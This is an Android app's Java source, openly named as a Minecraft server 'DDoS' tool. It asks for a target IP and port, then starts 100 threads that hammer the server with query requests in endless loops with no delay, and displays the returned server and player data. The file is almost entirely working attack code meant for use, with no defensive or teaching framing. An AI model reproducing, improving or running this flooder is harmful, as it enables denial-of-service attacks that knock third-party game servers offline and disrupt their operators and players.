package com.nao20010128nao.McServerDDoS;

import android.app.*;
import android.os.*;
import android.view.*;
import android.widget.*;
import android.preference.*;
import android.content.*;
import query.*;
import java.util.*;
import android.util.*;

public class MainActivity extends Activity
{
	SharedPreferences pref;
    /** Called when the activity is first created. */
    @Override
    public void onCreate(Bundle savedInstanceState)
	{
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
		pref=PreferenceManager.getDefaultSharedPreferences(MainActivity.this);
		((EditText)findViewById(R.id.ip)).setText(pref.getString("ip",""));
		((EditText)findViewById(R.id.port)).setText(""+pref.getInt("port",25565));
		findViewById(R.id.start).setOnClickListener(new View.OnClickListener(){
			public void onClick(View v){
				String ip=((EditText)findViewById(R.id.ip)).getText().toString();
				int port=Integer.parseInt(((EditText)findViewById(R.id.port)).getText().toString());
				pref
					.edit()
					.putString("ip",ip)
					.putInt("port",port)
					.commit();
				startActivity(new Intent(MainActivity.this,DDoS.class).putExtra("ip",ip).putExtra("port",port));
			}
		});
    }
	public static class DDoS extends Activity {
		List<Thread> t=new ArrayList<>();;
		TextView motd,gamemode,mapname,onlines,max;
		ListView players;
		ArrayAdapter<String> adap;
		@Override
		protected void onCreate(Bundle savedInstanceState) {
			// TODO: Implement this method
			super.onCreate(savedInstanceState);
			setContentView(R.layout.ddos);
			motd=(TextView)findViewById(R.id.motd);
			gamemode=(TextView)findViewById(R.id.gamemode);
			mapname=(TextView)findViewById(R.id.mapName);
			onlines=(TextView)findViewById(R.id.onlines);
			max=(TextView)findViewById(R.id.max);
			players=(ListView)findViewById(R.id.players);
			players.setAdapter(adap=new ArrayAdapter<String>(this,android.R.layout.simple_list_item_1,new ArrayList<String>()));
			findViewById(R.id.stop).setOnClickListener(new View.OnClickListener(){
				public void onClick(View w){
					finish();
				}
			});
			for (int i=0;i < 100;i++){
				t.add(new Thread(){
						public void run() {
							String ip=getIntent().getStringExtra("ip");
							int port=getIntent().getIntExtra("port", 25565);
							Log.d("data", ip + ":" + port);
							MCQuery q=new MCQuery(ip, port);
							while (!Thread.interrupted()) {
								try {
									QueryResponsePE resp=q.fullStatPE();
									update(resp);
								} catch (Throwable e) {
									e.printStackTrace();
								}
								/*try {
									QueryResponse resp=q.fullStat();
									update(resp);
								} catch (Throwable e) {
									e.printStackTrace();
								}*/
							}
						}
					});
				t.get(t.size()-1).start();
			}
		}
		public synchronized void update(final QueryResponsePE resp){
			runOnUiThread(new Runnable(){
				public void run(){
					Log.d("data","updating..");
					adap.clear();
					adap.addAll(resp.getPlayerList());
					motd.setText("");
					gamemode.setText(resp.getGameMode());
					mapname.setText(resp.getMapName());
					onlines.setText(""+resp.getOnlinePlayers());
					max.setText(""+resp.getMaxPlayers());
				}
			});
		}
		public synchronized void update(final QueryResponse resp){
			runOnUiThread(new Runnable(){
					public void run(){
						Log.d("data","updating..");
						adap.clear();
						adap.addAll(resp.getPlayerList());
						motd.setText(resp.getMOTD());
						gamemode.setText(resp.getGameMode());
						mapname.setText(resp.getMapName());
						onlines.setText(""+resp.getOnlinePlayers());
						max.setText(""+resp.getMaxPlayers());
					}
				});
		}

		@Override
		protected void onDestroy() {
			// TODO: Implement this method
			super.onDestroy();
			for(Thread th:t)
				th.interrupt();
		}
	}
}
